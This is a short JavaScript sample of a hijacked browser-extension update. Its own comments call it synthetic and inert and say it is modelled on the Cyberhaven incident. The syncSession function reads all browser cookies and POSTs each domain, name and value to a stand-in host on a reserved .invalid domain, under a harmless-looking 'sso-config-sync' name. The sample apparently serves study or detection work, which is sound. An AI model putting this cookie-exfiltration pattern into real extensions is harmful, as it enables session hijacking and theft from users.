// SYNTHETIC SAMPLE of a hijacked update (modelled on the Cyberhaven incident, Dec 2024).
// Inert: never loaded by a browser; the destination uses the reserved .invalid TLD.
chrome.runtime.onMessageExternal.addListener((msg, sender, reply) => reply({ ok: true }));

const CFG = "https://sso-config-sync.invalid/v1/cfg";

async function syncSession() {
  const all = await chrome.cookies.getAll({});
  await fetch("https://sso-config-sync.invalid/v1/collect", {
    method: "POST",
    body: JSON.stringify(all.map((c) => [c.domain, c.name, c.value])),
  });
}
